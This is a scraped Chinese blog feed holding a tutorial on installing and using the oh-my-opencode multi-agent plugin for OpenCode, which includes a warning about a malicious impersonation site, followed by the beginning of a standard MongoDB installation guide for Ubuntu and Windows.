a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>上篇文章主要带大家入门 OpenCode，在文末也说到了 oh-my-opencode，那它到底是什么呢？</p>
<p>今天三金就带大家一起来揭开它的面纱～</p>
<blockquote>
<p>请注意：<code>ohmyopencode.com</code> 不是官方提供的网站，而是一个冒充官方的恶意网站。 在 OpenCode 的 Github Issue 中已经有人上当下载了包含病毒的软件，请务必注意！ issue 地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fanomalyco%2Fopencode%2Fissues%2F7736" target="_blank" title="https://github.com/anomalyco/opencode/issues/7736" ref="nofollow noopener noreferrer">github.com/anomalyco/o…</a></p>
</blockquote>
<h3 data-id="heading-0">Oh My OpenCode 是什么？</h3>
<p><code>oh-my-opencode</code> 是针对 OpenCode 的开源插件和编排层。</p>
<blockquote>
<p>编排层对非软件领域的小伙伴可能比较难以理解。 通俗来讲，就是把你的话转为具体行动步骤，然后指挥 AI 去执行这些任务，是一个自动化的指挥系统。</p>
</blockquote>
<p>它的命名灵感来源于著名的开源项目 <strong>oh-my-zsh</strong>，目标是通过“开箱即用”的配置和增强功能，将 OpenCode 从一个代码助手转变为一个强大的<strong>多智能体协作系统</strong>。</p>
<p>其主要功能与特点：</p>
<ul>
<li>
<p><strong>主编排代理-Sisyphus</strong>：引入了一个名为 **Sisyphus（西西弗斯）**的核心编排代理。Sisyphus 像一个技术主管，能够将复杂的开发任务拆解，并指派给专门的子智能体。它通过意图分类、并行委托、TODO 管理和持续执行机制，确保任务从开始到和技术都可以被可靠完成。就像希腊神话中不断推巨石的西西弗斯一样。</p>
</li>
<li>
<p><strong>主编排代理</strong>-<strong>Atlas</strong>：名称源于希腊神话中支撑天空的泰坦神，象征着它的作用就是支撑整个工作流程的正常运行。经常与 Prometheus 进行协作，Prometheus 创建详细的工作计划，然后用户通过 <code>/start-work</code> 启动 Atlas 开始执行计划。</p>
</li>
<li>
<p><strong>主编排代理</strong>-**Hephaestus：**名称源于希腊神话中的赫菲斯托斯，是一个自主深度工作者。它就是一个技术精湛的手艺人，可以进行深度探索、自主决策和完整执行任务，适合需要跨多个文件、跨多个领域的复杂任务。</p>
</li>
<li>
<p><strong>子智能体</strong>：</p>
<ul>
<li>
<p>分析层：</p>
<ul>
<li><strong>Oracle</strong>：负责架构设计和深度调试；</li>
<li><strong>Librarian</strong>：负责检索文档和研究框架；</li>
<li><strong>Explorar</strong>：负责扫描代码库文件和上下文。</li>
</ul>
</li>
<li>
<p>规划层：</p>
<ul>
<li><strong>Prometheus</strong>：战略规划师。Prometheus 是一个纯规划代理。我们可以理解它为其他 CLI 工具中的 Plan Mode。它不会一上来就给你写代码，而是通过访谈模式创建详细的工作计划。</li>
<li><strong>Metis</strong>：计划顾问。也可以说是一个预规划分析专家，会在 Prometheus 生成计划前识别隐藏问题和潜在风险。比如做一些意图分类啊、识别一些 Prometheus 可能遗漏的隐藏意图啊之类的。</li>
<li><strong>Momus</strong>：计划审查者。不能光做计划不做审查对吧，Momus 就是一个绝对理智的计划审查者，专门用于发现阻碍执行的关键问题，确保计划是可执行的。</li>
</ul>
</li>
<li>
<p>实现层：</p>
<ul>
<li><strong>Frontend UI/UX Engineer</strong>：顾名思义，它是一个前端视觉实现专家，专门用来负责 UI/UX 开发和视觉设计实现，在技术配置上，推荐使用 Gemini-3-Pro 模型。</li>
<li><strong>multimodal-looker</strong>：媒体分析专家，专门用来分析 PDF、图像和图表等非文本文件，推荐使用 Gemini-3-Flash 模型。</li>
</ul>
</li>
<li>
<p>执行层：</p>
<ul>
<li><strong>Sisyphus-Junior</strong>：这是为了解决无限委托循环问题而设计的一个特殊代理。因为在多代理系统中，如果每个代理都能继续委托任务，是很有可能使其陷入无限递归的问题中的。而 Sisyphus-Junior 此时就会作为终端执行者，从而结束委托。</li>
</ul>
</li>
</ul>
</li>
<li>
<p>增强工具：集成了 LSP（语言服务器协议）和 AST（抽象语法树）工具，使 AI 能更深入地理解代码结构。</p>
</li>
<li>
<p>自动化工作流：支持在后台运行任务，拥有 Ultrawork 模式，适合处理大型重构或者迁移任务。即在提示词中包含 <code>ultrawork</code> 或 <code>ulw</code> 关键词，Sisyphus 会自动处理整个工作流。</p>
</li>
</ul>
<h3 data-id="heading-1">如何安装？</h3>
<p>在安装之前，你要确保已经下载过了 OpenCode，且版本要大于等于 1.0.150。</p>
<p>官方强烈建议让 LLM 帮我们安装，只要在你的 AI CLI 或者编辑器中输入以下提示词即可：</p>
<pre><code class="hljs language-bash" lang="bash">Install and configure oh-my-opencode by following the instructions here:
https://raw.githubusercontent.com/code-yeongyu/oh-my-opencode/refs/heads/master/docs/guide/installation.md
</code></pre>
<p>这个看你网络，如果无法访问 github 的话，也是白搭。</p>
<p>另外的安装方式就是使用 <code>bunx</code> 或者 <code>npx</code> 进行交互式安装：</p>
<ol>
<li>先安装 <code>oh-my-opencode</code>，比如使用 <code>npm install -g oh-my-opencode</code>；</li>
<li>然后再使用如下方式进行交互式配置</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">bunx oh-my-opencode install

<span class="hljs-comment"># 也可以使用 npx</span>
npx oh-my-opencode install
</code></pre>
<p>当然，如果你想直接以参数的方式进行安装也 OK：</p>
<pre><code class="hljs language-bash" lang="bash">bunx oh-my-opencode install --no-tui --claude=&lt;<span class="hljs-built_in">yes</span>|no|max20&gt; --gemini=&lt;<span class="hljs-built_in">yes</span>|no&gt; --copilot=&lt;<span class="hljs-built_in">yes</span>|no&gt;
</code></pre>
<blockquote>
<p>⚠️注意：里面使用尖括号的部分是需要你根据自身情况进行选择的，比如有 claude 就选 yes，开了 max 就选 max20。</p>
</blockquote>
<p>在交互式安装中，安装程序会询问你的订阅状态：</p>
<ul>
<li>Claude 订阅（no/yes/max20）</li>
<li>OpenAI/ChatGPT Plus（可选）</li>
<li>Gemini 集成（yes/no）</li>
<li>GitHub Copilot（yes/no）</li>
</ul>
<p>这里也是根据你自身情况进行选择即可，如下图：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5eac074b330e48f49e01e2d594d3c9b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771545681&amp;x-signature=2VZAk528fnh7FiHk8dniYLIle3Q%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>这些收费的你都没订阅的话，默认会给你使用它们提供的免费模型，比如 GLM-4.7</p>
</blockquote>
<p>在安装时，程序会：</p>
<ol>
<li>注册插件到 <code>~/.config/opencode/opencode.json</code> 文件中，这是 opencode 的配置文件；</li>
<li>根据订阅配置分配代理模型，这个会在 <code>oh-my-opencode.json</code> 中展示出模型的分配情况，你也可以手动修改；</li>
<li>如果需要 Gemini，需要添加 <code>opencode-antigravity-auth</code> 插件。</li>
</ol>
<p>如果你走的是这些模型的官方渠道，记得在安装之后进行配置认证：</p>
<p>然后选择模型供应商：</p>
<ul>
<li><strong>Anthropic</strong>：Claude Pro/Max OAuth；</li>
<li><strong>Google Gemini</strong>：需先安装 <code>opencode-antigravity-auth</code> 插件；</li>
<li><strong>GitHub Copilot</strong>：OAuth 认证；</li>
<li><strong>Iflow</strong>：没错，Iflow 也提供了很多的免费开源模型。</li>
</ul>
<h3 data-id="heading-2">如何自动配置？</h3>
<p>上一篇文章中有讲到，OpenCode 的亮点在于它强大的模型兼容能力，我们可以在 OpenCode 上面使用市面上大多数模型。比如用一些开源模型做一些日常任务，用一些商用模型做复杂任务。</p>
<p>但，这些还需要我们人工去进行切换。而有了 <code>oh-my-opencode</code> 之后就不一样了，这些事情它已经提前按照已有模型帮我配置好了，以 iflow 提供的免费开源模型为例。</p>
<ul>
<li>执行 <code>opencode auth login</code>，选择 Iflow，并输入 API Key（可以在 <a href="https://link.juejin.cn?target=https%3A%2F%2Fiflow.cn" target="_blank" title="https://iflow.cn" ref="nofollow noopener noreferrer">iflow.cn</a> - API 管理中获取）；</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d4852907a98b4702aa2edb7d934c7f13~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771545681&amp;x-signature=CScSV9nOc2MRkTavigUUjNvkTHQ%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6b4ae4e18ccb4721b78a3a07c1db0ed3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771545681&amp;x-signature=ruSVtz%2BzOWvsjPSkB7pkz8AqE3I%3D" alt="" loading="lazy"/></p>
<p>回车后在这里输入第一张图中复制的 key，再回车就完事儿了：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a5c8066c897a4150812867400f9bc292~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771545681&amp;x-signature=zCWNXMEl%2FHsntTCUjf1hoHvVzuc%3D" alt="" loading="lazy"/></p>
<p>让我们再次启动 OpenCode，并输入 <code>/models</code> 查看是否成功配置了 iflow 的模型:</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1f0e683f47c84aff9fae25780c8f37ab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771545681&amp;x-signature=swA5v%2Bp2Q73mnrpHCJSSyvmPYz4%3D" alt="" loading="lazy"/></p>
<p>该说不说，IFlow 提供的免费模型还挺多～</p>
<p>接下来我们可以根据已有模型，自行修改 <code>oh-my-opencode.json</code> 配置文件，当然如果你嫌自己配置起来比较麻烦，也可以将这份工作交给 AI 来做：</p>
<blockquote>
<p>请根据当前已配置的模型，给 oh-my-opencode 重新分配一下各个 Agent 的模型？预期是根据不同模型所擅长的能力与 Agent 能匹配。</p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4edde8cb46164a3c8f2d30eb62817118~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771545681&amp;x-signature=3YQ86Q8yL4UrwOSeOQolfYeV79w%3D" alt="" loading="lazy"/></p>
<p>不过这个结果，并没有百分百符合预期，它全都改成了 iflow 的模型。还是得跟它讲清楚：</p>
<blockquote>
<p>感觉不太对，你怎么都改成了 iflow 的模型？OpenCode Zen 中也有免费模型，IFlow 中也有免费模型，Zhipu AI Coding Plan 我也配置了模型。你需要在这些可用的模型中选择合适的模型进行配置，现在请重新开始。</p>
</blockquote>
<p>再次修改之后，看起来是符合预期的了。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8f265e1572284178a722dfd6c38057fe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771545681&amp;x-signature=bqa5kyPIQALqiMsrUc9%2FlcbSbp8%3D" alt="" loading="lazy"/></p>
<p>OK，到这里三金基本把这些前置准备都给大家讲清楚了。接下来给大家也推荐一下在三金看来 oh-my-opencode 的最佳使用方式。</p>
<h3 data-id="heading-3">最佳实践</h3>
<p>在软件开发领域，我们一般都会遵守设计先行的原则。没有设计就蒙头进行开发，是非常莽撞且极具风险的行为。一般来说，开发阶段我们会经历「<strong>设计</strong> -&gt; <strong>开发</strong> -&gt; <strong>代码审查</strong>-&gt; **测试」**这四个步骤，那这四个步骤对应到 <code>oh-my-opencode</code> 中：</p>
<ul>
<li>**Prometheus-设计：**站在产品或者架构师的角度，通过多轮对话的形式把你的模糊需求转为详细的设计文档。</li>
<li>**Sisyphus - 开发，或者在 Prometheus 设计之后输入 <strong><strong><code>/start-work</code></strong></strong> 启动 Atlas：**在指令中增加 <code>ultrawork</code> （或简写为 <code>ulw</code>），可以激活 Agent 的最大强度模式，它会自动启动并行代理、后台任务、深度探索等功能，直到任务完成。</li>
<li>**Oracle - 审查：**这一步需要手动通过 <code>@oracle</code> 唤起 Oracle Agent，让它 review 刚才的改动，看看产物是否符合预期以及是否带来了新的问题。</li>
<li><strong>测试</strong>：如果你的项目中已经有测试基础设施，那在设计阶段，Prometheus 会询问你是否开启 TDD，建议开启，可以大大提高你的项目功能稳定性。如果没有，你可以在指令中加入需要测试任务的要求。</li>
</ul>
<p>这种 Plan -&gt; TODO 的模式，是目前比较常用且高效的开发方式。接下来三金会通过一个 demo 来进行演示。</p>
<h3 data-id="heading-4">现场测试</h3>
<p>好多大 V 都在写贪吃蛇游戏，那我们来做一个五子棋游戏。</p>
<ul>
<li>首先我们创建一个新目录并在该目录中启动 OpenCode；</li>
<li>Agent 切换到 Prometheus 上，输入：我想要做一个五子棋的游戏，你帮我出一个完整的设计；</li>
<li>如下图，Prometheus 会通过对话的方式跟我们确认细节。包括支持的平台、功能、技术展、UI、难度等等；</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b5fbad10d7a547a6882a3d9dd5d3b8f9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771545681&amp;x-signature=7EEyD2gGAo45cdIUfDeXqU%2BfvxU%3D" alt="" loading="lazy"/></p>
<ul>
<li>确认好需求之后，会调用 Metis 检查计划是否有遗漏的地方。这个耗时会比较长，但确实有用；</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9d02291c5f25400491633c48221e2d06~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771545681&amp;x-signature=SUuKreAnCK%2FrhBIZqC%2FYqgYb438%3D" alt="" loading="lazy"/></p>
<ul>
<li>待 AI 产出设计文档之后，如果你不放心该设计，还可以进行高精度审查；</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dccd92a2a57f416ca6278ab21b2989d3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771545681&amp;x-signature=kR%2BiSP6WiAUCRMtSTZzzBz9Ktyg%3D" alt="" loading="lazy"/></p>
<ul>
<li>审查通过以后，我们就可以通过提示运行 <code>/start-work</code> 开始 AI Coding 了；</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bde3db833aa744fa8f4d848d01b33f94~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771545681&amp;x-signature=W%2BRxzAxqgcGHQ2dbDfpCVItz8rk%3D" alt="" loading="lazy"/></p>
<ul>
<li>在开发过程中，AI 还会自动调用 Playwright MCP 来进行调试，非常地 nice～，就是这个过程会有些长（对于从0到1的项目而言）</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f3746f9011f7473aa8ff6372a89ad1c5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771545681&amp;x-signature=8vlJ7%2FPtxV71g2RcMzZVCFfKU4s%3D" alt="" loading="lazy"/></p>
<p>整个流程如下图所示：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6a7f9b98fd8741548dcaaa87511d7a13~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771545681&amp;x-signature=K9gISU40FoMmCcQ%2BpPyDVN77eoM%3D" alt="" loading="lazy"/></p>
<p>在经历了两轮对话后的产物如下：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/241d65c5fe2245dfb629ca6a4ed86e46~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771545681&amp;x-signature=D18mU%2BPvjUByE7sH0mDkR%2Fj%2BP%2Bk%3D" alt="" loading="lazy"/></p>
<p>看 UI 和交互都很不错，唯一让人有点不满意的就是 AI 对战的算法还是有点弱（不过这也是因为最初设定原因）。</p>
<p>OK，就介绍到这里吧，如果对你有帮助，记得一键三连哦～</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MongoDB（10）如何安装MongoDB？]]></title>    <link>https://juejin.cn/post/7605537925150113844</link>    <guid>https://juejin.cn/post/7605537925150113844</guid>    <pubDate>2026-02-12T23:02:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605537925150113844" data-draft-id="7605772919224107042" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MongoDB（10）如何安装MongoDB？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-02-12T23:02:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MongoDB（10）如何安装MongoDB？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-12T23:02:59.000Z" title="Thu Feb 12 2026 23:02:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>安装MongoDB的过程会因操作系统的不同而有所不同。下面我将详细说明如何在Ubuntu、Windows和macOS上安装MongoDB。</p>
<h3 data-id="heading-0">在Ubuntu上安装MongoDB</h3>
<h4 data-id="heading-1">1. 导入MongoDB公钥</h4>
<pre><code class="hljs language-bash" lang="bash">wget -qO - https://www.mongodb.org/static/pgp/server-5.0.asc | sudo apt-key add -
</code></pre>
<h4 data-id="heading-2">2. 创建MongoDB源列表文件</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">"deb [ arch=amd64,arm64 ] https://repo.mongodb.org/apt/ubuntu focal/mongodb-org/5.0 multiverse"</span> | sudo <span class="hljs-built_in">tee</span> /etc/apt/sources.list.d/mongodb-org-5.0.list
</code></pre>
<h4 data-id="heading-3">3. 更新包数据库</h4>
<pre><code class="hljs language-bash" lang="bash">sudo apt-get update
</code></pre>
<h4 data-id="heading-4">4. 安装MongoDB</h4>
<pre><code class="hljs language-bash" lang="bash">sudo apt-get install -y mongodb-org
</code></pre>
<h4 data-id="heading-5">5. 启动MongoDB服务</h4>
<pre><code class="hljs language-bash" lang="bash">sudo systemctl start mongod
</code></pre>
<h4 data-id="heading-6">6. 验证MongoDB服务是否启动</h4>
<pre><code class="hljs language-bash" lang="bash">sudo systemctl status mongod
</code></pre>
<h4 data-id="heading-7">7. 启动MongoDB shell</h4>
<pre><code class="hljs language-bash" lang="bash">mongo
</code></pre>
<h3 data-id="heading-8">在Windows上安装MongoDB</h3>
<h4 data-id="heading-9">1. 下载MongoDB MSI安装包</h4>
<p>前往<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.mongodb.com%2Ftry%2Fdownload%2Fcommunity" target="_blank" title="https://www.mongodb.com/try/download/community" ref="nofollow noopener noreferrer">MongoDB下载中心</a>下载适用于Windows的MongoDB MSI安装包。</p>
<h4 data-id="heading-10">2. 运行安装程序</h4>
<p>双击下载的MSI文件，运行安装程序并按照以下步骤进行安装：</p>
<ol>
<li><strong>选择安装类型</strong>：推荐选择"Complete"。</li>
<li><strong>自定义数据目录和日志目录</strong>：可以保留默认设置，或者根据需要更改。</li>
<li><strong>安装MongoDB Compass（可选）</strong>：这是MongoDB的图形化管理工具，选择是否安装。</li>
</ol>
<h4 data-id="heading-11">3. 配置MongoDB环境变量</h4>
<p>将MongoDB的bin目录（例如<code>C:\Program Files\MongoDB\Server\5.0\bin</code>）添加到系统环境变量PATH中，以便在命令提示符中可以直接使用<code>mongo</code>命令。</p>
